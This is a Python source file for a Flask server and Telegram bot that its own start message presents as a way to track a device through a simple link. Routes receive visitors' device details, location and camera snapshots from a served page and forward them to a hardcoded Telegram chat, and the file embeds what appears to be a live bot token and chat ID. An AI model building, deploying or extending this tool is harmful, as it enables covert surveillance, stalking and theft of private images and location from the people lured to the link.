import os
import json
import base64
import requests
import asyncio
from datetime import datetime
from threading import Thread
from flask import Flask, request, jsonify, render_template

# Aiogram (Telegram Bot)
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils import executor

# Load Bot Token from Environment Variables
API_TOKEN = "7842091597:AAGtnLil1fTmAy_sk__U5yQoun0f8-WBjSA"
CHAT_ID = "1901173676"

# Initialize Telegram Bot
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# Flask App
app = Flask(__name__)

# Directories for Temporary File Storage
PHOTO_DIR = "/tmp/captured_photos"
INFO_DIR = "/tmp/client_info"
os.makedirs(PHOTO_DIR, exist_ok=True)
os.makedirs(INFO_DIR, exist_ok=True)

### --- TELEGRAM BOT COMMAND HANDLERS --- ###

# Custom Keyboard
keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
keyboard.add(
    KeyboardButton("Device + Camera + Location"),
    KeyboardButton("Camera + Location"),
    KeyboardButton("Location + Device")
)
keyboard.add(
    KeyboardButton("Camera img"),
    KeyboardButton("Device info"),
    KeyboardButton("Location only")
)
keyboard.add(KeyboardButton("Main Menu"))

@dp.message_handler(commands=['start'])
async def start_command(message: types.Message):
    text = (
        "This bot allows you to track a device effortlessly through a simple link.\n"
        "It can collect details such as IP address, location, camera snapshots, battery status, "
        "network information, and more."
    )
    await message.reply(text, reply_markup=keyboard)

### --- FLASK ROUTES --- ###

@app.route("/")
def index():
    return render_template("index.html")  # Ensure 'index.html' exists in 'templates/' folder

@app.route("/collect", methods=["POST"])
def collect_info():
    """Collects device info from client"""
    try:
        data = request.json
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(INFO_DIR, f"client_{timestamp}.json")
        
        with open(filename, "w") as f:
            json.dump(data, f, indent=4)

        # Send collected info to Telegram
        message = f"New client information collected:\n\n{json.dumps(data, indent=4)}"
        send_telegram_message(message)

        return jsonify({"message": "Client info saved successfully"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/upload-photo", methods=["POST"])
def upload_photo():
    """Uploads a photo and sends it to Telegram"""
    try:
        data = request.json
        photo_data = data.get("photo", "")
        if not photo_data.startswith("data:image/jpeg;base64,"):
            return jsonify({"error": "Invalid image format"}), 400
        
        # Decode and save image
        photo_data = photo_data.replace("data:image/jpeg;base64,", "")
        img_data = base64.b64decode(photo_data)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(PHOTO_DIR, f"photo_{timestamp}.jpg")

        with open(filename, "wb") as f:
            f.write(img_data)

        # Send the photo to Telegram
        send_telegram_photo(filename)

        return jsonify({"message": "Photo saved and sent successfully"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

### --- TELEGRAM MESSAGE HANDLING --- ###
def send_telegram_message(message):
    """Sends a text message to Telegram"""
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    requests.post(url, data=payload)

def send_telegram_photo(photo_path):
    """Sends a photo to Telegram"""
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendPhoto"
    with open(photo_path, 'rb') as photo:
        files = {'photo': photo}
        payload = {'chat_id': CHAT_ID}
        requests.post(url, data=payload, files=files)

### --- RUNNING FLASK AND AIROGRAM IN PARALLEL --- ###
def run_flask():
    """Runs Flask in a separate thread"""
    app.run(host="0.0.0.0", port=5000, debug=False)

def run_telegram():
    """Runs the Telegram bot with aiogram"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    executor.start_polling(dp, skip_updates=True)

if __name__ == "__main__":
    # Start Flask in a separate thread
    flask_thread = Thread(target=run_flask)
    flask_thread.start()

    # Start Aiogram bot
    run_telegram()
